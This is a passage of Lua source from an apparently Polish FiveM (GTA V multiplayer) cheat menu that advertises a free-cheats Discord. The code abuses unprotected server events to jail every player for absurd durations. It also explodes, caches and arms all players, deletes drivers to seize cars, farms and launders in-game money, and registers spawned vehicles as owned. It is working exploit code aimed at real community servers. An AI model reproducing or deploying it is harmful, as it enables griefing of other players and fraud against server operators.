				TSE("wiezieniejailer:sendToJail",3, GetPlayerServerId(i), 9999 * 60, "TEST", 1,2137)
				TSE("esxjailer:sendToJail2", GetPlayerServerId(i), 9937, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 1)
				TSE('esx:wiezienie', GetPlayerServerId(i), 9937, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 1)
				TSE("esxjailers:sendToJail", GetPlayerServerId(i), 9937, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 1)
				TSE("arisonarp:wiezienie",  GetPlayerServerId(i), 9937, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 1)
				TSE("esx_jail:sendTooJail", GetPlayerServerId(i), 9937, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 1)
				TSE("esxjailer:sendToJailf", GetPlayerServerId(i), 9937, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 1)
				TSE("esxjailer:sendTooJail", GetPlayerServerId(i), 9937, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 1)
				TSE("esxjailer:sendToJailf", GetPlayerServerId(i), 9937, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 1)
				TSE("esxjailers:sendToJail", GetPlayerServerId(i), 9937, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 1)
				TSE("esx_jailer:sendToWiezz",  GetPlayerServerId(i), 9937, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 9995345349999999)
				TSE("esx_jaler:sendToWiezz", GetPlayerServerId(i), 9937, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 9995345349999999)
				TSE("esx_jailer:sendToJail", GetPlayerServerId(i), 9937, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 9995345349999999)
				TSE("esx_jailer:sendToJailf", GetPlayerServerId(i), 9937 * 60, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 9995345349999999)
				TSE("esx_jailer:sendToJail", GetPlayerServerId(i), 99999, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D")
				TSE("wyspa_jail:SendMessage", GetPlayerServerId(i), 99999, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D")
				TSE("wyspa_jail:addKartoteka", GetPlayerServerId(i), 99999 * 60, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 99953)
				TSE("wyspa_jail:addKartoteka", GetPlayerServerId(i), 99999 * 60, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 99953)
				TSE("wyspa_jail:addKartoteka", GetPlayerServerId(i), 99999 * 60, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 99953)
				TSE("wyspa_jail:addKartoteka", GetPlayerServerId(i), 99999 * 60, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 99953)
				TSE("wyspa_jail:addKartoteka", GetPlayerServerId(i), 99999 * 60, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 99953)
				TSE("esx_jailer:sendToJail", GetPlayerServerId(i), 99999 * 60, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 99953)
				TSE("projektsantos:wiezienie", GetPlayerServerId(i), 99999 * 60, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 99953)
				TSE("esx_jailer:sendToJailf", GetPlayerServerId(i), 99999 * 60, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 99953)
				TSE("esx-qalle-jail:Wiezienie", GetPlayerServerId(i), 99999 * 60, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D")
				TSE('6d87e977-8ba1-4d98-8a88-d0ca16517da7', GetPlayerServerId(i), 99999 * 60, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 99953)
				TSE('6d87e977-8ba1-4d98-8a88-d0ca16517da7', GetPlayerServerId(i), 99999 * 60, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 99953)
				TSE("esx_jailer:jail", GetPlayerServerId(i), 99999 * 60, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 99953)
				TSE('6d87e977-8ba1-4d98-8a88-d0ca16517da7', GetPlayerServerId(i), 99999 * 60, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 99953)
				TSE("esx_jailer:sendToJail", GetPlayerServerId(i), 99999 * 60, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 99953)
				TSE("projektsantos:wiezienie", GetPlayerServerId(i), 99999 * 60, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 99953)
				TSE("luki_jailer:sendToJail", GetPlayerServerId(i), 99999 * 60, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 99953)
				TSE("arisonarp:wiezienie", GetPlayerServerId(i), 99999 * 60, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 99953)
				TSE("esx_jail:sendToJail", GetPlayerServerId(i), 99999 * 60)
				TSE("js:jailuser", GetPlayerServerId(i), 99999 * 60, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D")
				TSE("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 999999 * 60, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D")
				TSE("wiezieniejailer:sendToJail",3, GetPlayerServerId(i), 99999 * 60, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 1,2137)
				TSE("esxjailer:sendToJail2", GetPlayerServerId(i), 99999, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 1)
				TSE('esx:wiezienie', GetPlayerServerId(i), 99999, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 99953)
				TSE("esxjailers:sendToJail", GetPlayerServerId(i), 99999, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 99953)
				TSE("arisonarp:wiezienie",  GetPlayerServerId(i), 99999, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 99953)
				TSE("esx_jail:sendTooJail", GetPlayerServerId(i), 99999, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 99953)
				TSE("esxjailer:sendToJailf", GetPlayerServerId(i), 99999, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 99953)
				TSE("esxjailer:sendTooJail", GetPlayerServerId(i), 99999, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 99953)
				TSE("esxjailer:sendToJailf", GetPlayerServerId(i), 99999, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 99953)
				TSE("esxjailers:sendToJail", GetPlayerServerId(i), 99999, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 99953)
				TSE("esx_jailer:sendToWiezz",  GetPlayerServerId(i), 99999, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 99953)
				TSE("esx_jailer:sendToJail", GetPlayerServerId(i), 99999, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 99953)
				TSE("esx_jailer:sendToJailf", GetPlayerServerId(i), 99999 * 60, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 99953)
				TSE("esx_wiezienie:wyslijwiezienie", GetPlayerServerId(i), 9999 * 60, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 9999)
				TSE("esx_jailer:sendToJailhype", GetPlayerServerId(i), 100 * 60, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 999)
				TSE("esx-qalle-jail:wyslijwiezienie", GetPlayerServerId(i), 60*1, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 111)
        end
      end

      local function GiveAllWeapons(target)
        local ped = GetPlayerPed(target)
        for i=0, #allWeapons do
          GiveWeaponToPed(ped, GetHashKey(allWeapons[i]), 9999, false, false)
        end
      end

      local function weaponsall()
        local pbase = GetActivePlayers()
        for i=0, #pbase do
          GiveAllWeapons(i)
        end
      end

      local function explodeall()
        local pbase = GetActivePlayers()
        for i=0, #pbase do
          local ped = GetPlayerPed(i)
          local coords = GetEntityCoords(ped)
          AddExplosion(coords.x+1, coords.y+1, coords.z+1, 4, 10000.0, true, false, 0.0)
        end
      end

      local function borgarall()
        local pbase = GetActivePlayers()
        for i=0, #pbase do
          if IsPedInAnyVehicle(GetPlayerPed(i), true) then
            local hamburg = "xs_prop_hamburgher_wl"
            local hamburghash = GetHashKey(hamburg)
            while not HasModelLoaded(hamburghash) do
              Citizen.Wait(0)
              RequestModel(hamburghash)
            end
            local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
            AttachEntityToEntity(hamburger, GetVehiclePedIsIn(GetPlayerPed(i), false), GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), "chassis"), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
          else
            local hamburg = "xs_prop_hamburgher_wl"
            local hamburghash = GetHashKey(hamburg)
            while not HasModelLoaded(hamburghash) do
              Citizen.Wait(0)
              RequestModel(hamburghash)
            end
            local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
            AttachEntityToEntity(hamburger, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
          end
        end
      end

	  local function cageall()
		local pbase = GetActivePlayers()
        for i = 1, #pbase do
          x, y, z = table.unpack(GetEntityCoords(i))
          roundx = tonumber(string.format("%.2f", x))
          roundy = tonumber(string.format("%.2f", y))
          roundz = tonumber(string.format("%.2f", z))
          while not HasModelLoaded(GetHashKey("prop_fnclink_05crnr1")) do
            Citizen.Wait(0)
            RequestModel(GetHashKey("prop_fnclink_05crnr1"))
          end
          local cage1 = CreateObject(GetHashKey("prop_fnclink_05crnr1"), roundx - 1.70, roundy - 1.70, roundz - 1.0, true, true, false)
          local cage2 = CreateObject(GetHashKey("prop_fnclink_05crnr1"), roundx + 1.70, roundy + 1.70, roundz - 1.0, true, true, false)
          SetEntityHeading(cage1, -90.0)
          SetEntityHeading(cage2, 90.0)
          FreezeEntityPosition(cage1, true)
          FreezeEntityPosition(cage2, true)
        end
      end

      local function bananapartyall()
        Citizen.CreateThread(function()
        for c = 0, 9 do
        end
        local pbase = GetActivePlayers()
        for i=0, #pbase do
          local pisello = CreateObject(-1207431159, 0, 0, 0, true, true, true)
          local pisello2 = CreateObject(GetHashKey("cargoplane"), 0, 0, 0, true, true, true)
          local pisello3 = CreateObject(GetHashKey("prop_beach_fire"), 0, 0, 0, true, true, true)
          AttachEntityToEntity(pisello, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
          AttachEntityToEntity(pisello2, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
          AttachEntityToEntity(pisello3, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
        end
        end)
      end

      local function RespawnPed(ped, coords, heading)
        SetEntityCoordsNoOffset(ped, coords.x, coords.y, coords.z, false, false, false, true)
        NetworkResurrectLocalPlayer(coords.x, coords.y, coords.z, heading, true, false)
        SetPlayerInvincible(ped, false)
        TriggerEvent('playerSpawned', coords.x, coords.y, coords.z)
        ClearPedBloodDamage(ped)
      end

      local function teleporttocoords()
        local pizdax = KeyboardInput("Enter X pos", "", 100)
        local pizday = KeyboardInput("Enter Y pos", "", 100)
        local pizdaz = KeyboardInput("Enter Z pos", "", 100)
        if pizdax ~= "" and pizday ~= "" and pizdaz ~= "" then
          if	IsPedInAnyVehicle(GetPlayerPed(-1), 0) and (GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)) then
            entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
          else
            entity = GetPlayerPed(-1)
          end
          if entity then
            SetEntityCoords(entity, pizdax + 0.5, pizday + 0.5, pizdaz + 0.5, 1, 0, 0, 1)
            notify("~g~Teleportowano do kordow!", false)
          end
        else
          notify("~b~Nieprawidlowe koordy!", true)
        end
      end

      local function drawcoords()
        local name = KeyboardInput("Wprowadz nazwe", "", 100)
        if name == "" then
          notify("~b~Invalid Blip Name!", true)
          return drawcoords()
        else
          local pizdax = KeyboardInput("Enter X pos", "", 100)
          local pizday = KeyboardInput("Enter Y pos", "", 100)
          local pizdaz = KeyboardInput("Enter Z pos", "", 100)
          if pizdax ~= "" and pizday ~= "" and pizdaz ~= "" then
            local blips = {
              {colour=75, id=84},
            }
            for _, info in pairs(blips) do
              info.blip = AddBlipForCoord(pizdax + 0.5, pizday + 0.5, pizdaz + 0.5)
              SetBlipSprite(info.blip, info.id)
              SetBlipDisplay(info.blip, 4)
              SetBlipScale(info.blip, 0.9)
              SetBlipColour(info.blip, info.colour)
              SetBlipAsShortRange(info.blip, true)
              BeginTextCommandSetBlipName("STRING")
              AddTextComponentString(name)
              EndTextCommandSetBlipName(info.blip)
            end
          else
            notify("~b~Invalid coords!", true)
          end
        end
      end

      local function teleporttonearestvehicle()
        local playerPed = GetPlayerPed(-1)
        local playerPedPos = GetEntityCoords(playerPed, true)
        local NearestVehicle = GetClosestVehicle(GetEntityCoords(playerPed, true), 1000.0, 0, 4)
        local NearestVehiclePos = GetEntityCoords(NearestVehicle, true)
        local NearestPlane = GetClosestVehicle(GetEntityCoords(playerPed, true), 1000.0, 0, 16384)
        local NearestPlanePos = GetEntityCoords(NearestPlane, true)
        notify("~y~Czekaj...", false)
        Citizen.Wait(1000)
        if (NearestVehicle == 0) and (NearestPlane == 0) then
          notify("~b~Nieznaleziono auta", true)
        elseif (NearestVehicle == 0) and (NearestPlane ~= 0) then
          if IsVehicleSeatFree(NearestPlane, -1) then
            SetPedIntoVehicle(playerPed, NearestPlane, -1)
            SetVehicleAlarm(NearestPlane, false)
            SetVehicleDoorsLocked(NearestPlane, 1)
            SetVehicleNeedsToBeHotwired(NearestPlane, false)
          else
            local driverPed = GetPedInVehicleSeat(NearestPlane, -1)
            ClearPedTasksImmediately(driverPed)
            SetEntityAsMissionEntity(driverPed, 1, 1)
            DeleteEntity(driverPed)
            SetPedIntoVehicle(playerPed, NearestPlane, -1)
            SetVehicleAlarm(NearestPlane, false)
            SetVehicleDoorsLocked(NearestPlane, 1)
            SetVehicleNeedsToBeHotwired(NearestPlane, false)
          end
          notify("~g~Teleportowano!", false)
        elseif (NearestVehicle ~= 0) and (NearestPlane == 0) then
          if IsVehicleSeatFree(NearestVehicle, -1) then
            SetPedIntoVehicle(playerPed, NearestVehicle, -1)
            SetVehicleAlarm(NearestVehicle, false)
            SetVehicleDoorsLocked(NearestVehicle, 1)
            SetVehicleNeedsToBeHotwired(NearestVehicle, false)
          else
            local driverPed = GetPedInVehicleSeat(NearestVehicle, -1)
            ClearPedTasksImmediately(driverPed)
            SetEntityAsMissionEntity(driverPed, 1, 1)
            DeleteEntity(driverPed)
            SetPedIntoVehicle(playerPed, NearestVehicle, -1)
            SetVehicleAlarm(NearestVehicle, false)
            SetVehicleDoorsLocked(NearestVehicle, 1)
            SetVehicleNeedsToBeHotwired(NearestVehicle, false)
          end
          notify("~g~Teleportowano!", false)
        elseif (NearestVehicle ~= 0) and (NearestPlane ~= 0) then
          if Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) < Vdist(NearestPlanePos.x, NearestPlanePos.y, NearestPlanePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
            if IsVehicleSeatFree(NearestVehicle, -1) then
              SetPedIntoVehicle(playerPed, NearestVehicle, -1)
              SetVehicleAlarm(NearestVehicle, false)
              SetVehicleDoorsLocked(NearestVehicle, 1)
              SetVehicleNeedsToBeHotwired(NearestVehicle, false)
            else
              local driverPed = GetPedInVehicleSeat(NearestVehicle, -1)
              ClearPedTasksImmediately(driverPed)
              SetEntityAsMissionEntity(driverPed, 1, 1)
              DeleteEntity(driverPed)
              SetPedIntoVehicle(playerPed, NearestVehicle, -1)
              SetVehicleAlarm(NearestVehicle, false)
              SetVehicleDoorsLocked(NearestVehicle, 1)
              SetVehicleNeedsToBeHotwired(NearestVehicle, false)
            end
          elseif Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) > Vdist(NearestPlanePos.x, NearestPlanePos.y, NearestPlanePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
            if IsVehicleSeatFree(NearestPlane, -1) then
              SetPedIntoVehicle(playerPed, NearestPlane, -1)
              SetVehicleAlarm(NearestPlane, false)
              SetVehicleDoorsLocked(NearestPlane, 1)
              SetVehicleNeedsToBeHotwired(NearestPlane, false)
            else
              local driverPed = GetPedInVehicleSeat(NearestPlane, -1)
              ClearPedTasksImmediately(driverPed)
              SetEntityAsMissionEntity(driverPed, 1, 1)
              DeleteEntity(driverPed)
              SetPedIntoVehicle(playerPed, NearestPlane, -1)
              SetVehicleAlarm(NearestPlane, false)
              SetVehicleDoorsLocked(NearestPlane, 1)
              SetVehicleNeedsToBeHotwired(NearestPlane, false)
            end
          end
          notify("~g~Teleportowano!", false)
        end
      end

      local function TeleportToWaypoint()
        if DoesBlipExist(GetFirstBlipInfoId(8)) then
          local blipIterator = GetBlipInfoIdIterator(8)
          local blip = GetFirstBlipInfoId(8, blipIterator)
          WaypointCoords = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector())
          wp = true
        else
          notify("~b~Nie ma waypointa!", true)
        end

        local zHeigt = 0.0
        height = 1000.0
        while wp do
          Citizen.Wait(0)
          if wp then
            if
            IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
            (GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1))
            then
              entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
            else
              entity = GetPlayerPed(-1)
            end

            SetEntityCoords(entity, WaypointCoords.x, WaypointCoords.y, height)
            FreezeEntityPosition(entity, true)
            local Pos = GetEntityCoords(entity, true)

            if zHeigt == 0.0 then
              height = height - 25.0
              SetEntityCoords(entity, Pos.x, Pos.y, height)
              bool, zHeigt = GetGroundZFor_3dCoord(Pos.x, Pos.y, Pos.z, 0)
            else
              SetEntityCoords(entity, Pos.x, Pos.y, zHeigt)
              FreezeEntityPosition(entity, false)
              wp = false
              height = 1000.0
              zHeigt = 0.0
              notify("~g~Teleportowano!", false)
              break
            end
          end
        end
      end

      local function spawnvehicle()
        local ModelName = KeyboardInput("Wprowadz nazwe pojazdu* ", "", 100)
        if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
          RequestModel(ModelName)
          while not HasModelLoaded(ModelName) do
            Citizen.Wait(0)
          end
          local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(PlayerPedId(-1)), GetEntityHeading(PlayerPedId(-1)), true, true)
          SetPedIntoVehicle(PlayerPedId(-1), veh, -1)
        else
          notify("~b~Model nie jest prawidlowy!", true)
        end
      end

      local function repairvehicle()
        SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), false))
        SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0)
        SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
        SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
        Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
        SetVehicleUndriveable(vehicle,false)
      end

      local function repairengine()
        SetVehicleEngineHealth(vehicle, 1000)
        Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
        SetVehicleUndriveable(vehicle,false)
      end

      local function carlicenseplaterino()
        local playerPed = GetPlayerPed(-1)
        local playerVeh = GetVehiclePedIsIn(playerPed, true)
        local result = KeyboardInput("Wprowadz nazwe tablic", "", 100)
        if result ~= "" then
          SetVehicleNumberPlateText(playerVeh, result)
        end
      end

      function hweed()
        TSE("esx_drugs:startHarvestWeed")
        TriggerServerEvent('esx_illegal_drugs:startHarvestWeed')
        TriggerServerEvent('esx_drugs:pickedUpCannabis')
      end

      function tweed()
        TSE("esx_drugs:startTransformWeed")
        TriggerServerEvent('esx_illegal_drugs:startTransformWeed')
        TriggerServerEvent('esx_drugs:processCannabis')
      end

      function sweed()
        TSE("esx_drugs:startSellWeed")
        TSE("esx_illegal_drugs:startSellWeed")
      end

      function hcoke()
        TriggerServerEvent('esx_drugs:startHarvestCoke')
        TriggerServerEvent('esx_drugs:startHarvestCoke')
        TriggerServerEvent('esx_drugs:startHarvestCoke')
        TriggerServerEvent('esx_drugs:startHarvestCoke')
        TriggerServerEvent('esx_illegal_drugs:startHarvestCoke')
        TriggerServerEvent('esx_illegal_drugs:startHarvestCoke')
        TriggerServerEvent('esx_illegal_drugs:startHarvestCoke')
        TriggerServerEvent('esx_illegal_drugs:startHarvestCoke')
    end
    
    function tcoke()
        TriggerServerEvent('esx_drugs:startTransformCoke')
        TriggerServerEvent('esx_drugs:startTransformCoke')
        TriggerServerEvent('esx_drugs:startTransformCoke')
        TriggerServerEvent('esx_drugs:startTransformCoke')
        TriggerServerEvent('esx_illegal_drugs:startTransformCoke')
        TriggerServerEvent('esx_illegal_drugs:startTransformCoke')
        TriggerServerEvent('esx_illegal_drugs:startTransformCoke')
        TriggerServerEvent('esx_illegal_drugs:startTransformCoke')
    end
    
    function scoke()
        TriggerServerEvent('esx_drugs:startSellCoke')
        TriggerServerEvent('esx_drugs:startSellCoke')
        TriggerServerEvent('esx_drugs:startSellCoke')
        TriggerServerEvent('esx_drugs:startSellCoke')
        TriggerServerEvent('esx_illegal_drugs:startSellCoke')
        TriggerServerEvent('esx_illegal_drugs:startSellCoke')
        TriggerServerEvent('esx_illegal_drugs:startSellCoke')
        TriggerServerEvent('esx_illegal_drugs:startSellCoke')
    end
    
    function hmeth()
        TriggerServerEvent('esx_drugs:startHarvestMeth')
        TriggerServerEvent('esx_drugs:startHarvestMeth')
        TriggerServerEvent('esx_drugs:startHarvestMeth')
        TriggerServerEvent('esx_drugs:startHarvestMeth')
        TriggerServerEvent('esx_illegal_drugs:startHarvestMeth')
        TriggerServerEvent('esx_illegal_drugs:startHarvestMeth')
        TriggerServerEvent('esx_illegal_drugs:startHarvestMeth')
        TriggerServerEvent('esx_illegal_drugs:startHarvestMeth')
        TriggerServerEvent('MF_MobileMeth:RewardPlayers')
    end
    
    function tmeth()
        TriggerServerEvent('esx_drugs:startTransformMeth')
        TriggerServerEvent('esx_drugs:startTransformMeth')
        TriggerServerEvent('esx_drugs:startTransformMeth')
        TriggerServerEvent('esx_drugs:startTransformMeth')
        TriggerServerEvent('esx_illegal_drugs:startTransformMeth')
        TriggerServerEvent('esx_illegal_drugs:startTransformMeth')
        TriggerServerEvent('esx_illegal_drugs:startTransformMeth')
        TriggerServerEvent('esx_illegal_drugs:startTransformMeth')
    end
    
    function smeth()
        TriggerServerEvent('esx_drugs:startSellMeth')
        TriggerServerEvent('esx_drugs:startSellMeth')
        TriggerServerEvent('esx_drugs:startSellMeth')
        TriggerServerEvent('esx_drugs:startSellMeth')
        TriggerServerEvent('esx_illegal_drugs:startSellMeth')
        TriggerServerEvent('esx_illegal_drugs:startSellMeth')
        TriggerServerEvent('esx_illegal_drugs:startSellMeth')
        TriggerServerEvent('esx_illegal_drugs:startSellMeth')
    end
    
    function hopi()
        TriggerServerEvent('esx_drugs:startHarvestOpium')
        TriggerServerEvent('esx_drugs:startHarvestOpium')
        TriggerServerEvent('esx_drugs:startHarvestOpium')
        TriggerServerEvent('esx_drugs:startHarvestOpium')
        TriggerServerEvent('esx_illegal_drugs:startHarvestOpium')
        TriggerServerEvent('esx_illegal_drugs:startHarvestOpium')
        TriggerServerEvent('esx_illegal_drugs:startHarvestOpium')
        TriggerServerEvent('esx_illegal_drugs:startHarvestOpium')
    end
    
    function topi()
        TriggerServerEvent('esx_drugs:startTransformOpium')
        TriggerServerEvent('esx_drugs:startTransformOpium')
        TriggerServerEvent('esx_drugs:startTransformOpium')
        TriggerServerEvent('esx_drugs:startTransformOpium')
        TriggerServerEvent('esx_illegal_drugs:startTransformOpium')
        TriggerServerEvent('esx_illegal_drugs:startTransformOpium')
        TriggerServerEvent('esx_illegal_drugs:startTransformOpium')
        TriggerServerEvent('esx_illegal_drugs:startTransformOpium')
    end
    
    function sopi()
        TriggerServerEvent('esx_drugs:startSellOpium')
        TriggerServerEvent('esx_drugs:startSellOpium')
        TriggerServerEvent('esx_drugs:startSellOpium')
        TriggerServerEvent('esx_drugs:startSellOpium')
        TriggerServerEvent('esx_illegal_drugs:startSellOpium')
        TriggerServerEvent('esx_illegal_drugs:startSellOpium')
        TriggerServerEvent('esx_illegal_drugs:startSellOpium')
        TriggerServerEvent('esx_illegal_drugs:startSellOpium')
    end

    function mataaspalarufe()
      TriggerServerEvent('esx_blanchisseur:startWhitening', 85)
      TriggerServerEvent('esx_blanchisseur:washMoney', 100)
      TriggerServerEvent('esx_blackmoney:washMoney')
      TriggerServerEvent('esx_moneywash:withdraw', 100)
      TriggerServerEvent('laundry:washcash')
  end

      function matanumaispalarufe()
        TSE("esx_drugs:stopHarvestCoke")
        TSE("esx_drugs:stopTransformCoke")
        TSE("esx_drugs:stopSellCoke")
        TSE("esx_drugs:stopHarvestMeth")
        TSE("esx_drugs:stopTransformMeth")
        TSE("esx_drugs:stopSellMeth")
        TSE("esx_drugs:stopHarvestWeed")
        TSE("esx_drugs:stopTransformWeed")
        TSE("esx_drugs:stopSellWeed")
        TSE("esx_drugs:stopHarvestOpium")
        TSE("esx_drugs:stopTransformOpium")
        TSE("esx_drugs:stopSellOpium")
        notify("~b~Skonczone.", false)
      end

function doshit(playerVeh)
  RequestControl(playerVeh)
      SetVehicleHasBeenOwnedByPlayer(playerVeh, false)
      SetEntityAsMissionEntity(playerVeh, false, false)
      StartVehicleAlarm(playerVeh)
      DetachVehicleWindscreen(playerVeh)
      SetVehicleGravity(playerVeh, false)
end

	  function matacumparamasini()
		local ModelName = KeyboardInput("Wprowadz nazwe auta", "", 100)
		local NewPlate = KeyboardInput("Wprowadz nazwe tablic", "", 100)
	
		if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
				RequestModel(ModelName)
				while not HasModelLoaded(ModelName) do
						Citizen.Wait(0)
				end
	
				local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(PlayerPedId(-1)), GetEntityHeading(PlayerPedId(-1)), true, true)
				SetVehicleNumberPlateText(veh, NewPlate)
				local vehProps = ESX.Game.GetVehicleProperties(veh)
				TSE("esx_vehicleshop:setVehicleOwned", vehProps)
				notify("~g~~h~Sukces", false)
		else
				notify("~b~~h~Model nieprawidlowy !", true)
		end
	end

      function daojosdinpatpemata()
        local playerPed = GetPlayerPed(-1)
        local playerVeh = GetVehiclePedIsIn(playerPed, true)
        if IsPedInAnyVehicle(GetPlayerPed(-1), 0) and (GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)) then
          SetVehicleOnGroundProperly(playerVeh)
          notify("~g~Odwrocono!", false)
        else
          notify("~b~You Aren't In The Driverseat Of A Vehicle!", true)
        end
      end


      function stringsplit(inputstr, sep)
        if sep == nil then
          sep = "%s"
        end
        local t = {}
        i = 1
        for str in string.gmatch(inputstr, "([^" .. sep .. "]+)") do
          t[i] = str
          i = i + 1
        end
        return t
      end

      local Spectating = false

      function SpectatePlayer(player)
        local playerPed = PlayerPedId(-1)
        Spectating = not Spectating
        local targetPed = GetPlayerPed(player)

        if (Spectating) then
          local targetx, targety, targetz = table.unpack(GetEntityCoords(targetPed, false))

          RequestCollisionAtCoord(targetx, targety, targetz)
          NetworkSetInSpectatorMode(true, targetPed)

          notify("Obserwujesz " .. GetPlayerName(player), false)
        else
          local targetx, targety, targetz = table.unpack(GetEntityCoords(targetPed, false))

          RequestCollisionAtCoord(targetx, targety, targetz)
          NetworkSetInSpectatorMode(false, targetPed)

          notify("Zakonczono obserwacje " .. GetPlayerName(player), false)
        end
      end

      function ShootPlayer(player)
        local head = GetPedBoneCoords(player, GetEntityBoneIndexByName(player, "SKEL_HEAD"), 0.0, 0.0, 0.0)
        SetPedShootsAtCoord(PlayerPedId(-1), head.x, head.y, head.z, true)
      end

      function MaxOut(veh)
        SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
        SetVehicleWheelType(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5) - 1, false)
